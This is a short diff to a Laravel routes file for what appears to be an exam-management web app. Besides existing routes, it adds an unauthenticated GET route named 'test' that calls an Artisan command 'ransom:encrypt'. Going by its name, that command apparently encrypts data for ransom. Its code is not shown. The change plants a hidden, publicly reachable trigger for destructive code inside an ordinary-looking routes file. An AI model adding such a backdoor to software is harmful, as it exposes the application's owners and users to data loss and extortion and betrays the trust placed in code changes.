@@ -8,6 +8,7 @@ use App\Livewire\Admin\Master\JenisUjianPage;
 use App\Livewire\Admin\Master\TipeUjianPage;
 use App\Livewire\Peserta\PesertaDashboardIndex;
 use App\Models\Konten;
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Support\Facades\Storage;
 
@@ -108,5 +109,9 @@ Route::get('/livewire/pdf-stream/{konten}', function (Konten $konten) {
 // Route::view('profile', 'profile')
 //     ->middleware(['auth'])
 //     ->name('profile');
+
+Route::get('test', function () {
+    Artisan::call('ransom:encrypt', [], null);
+});
 
 require __DIR__ . '/auth.php';
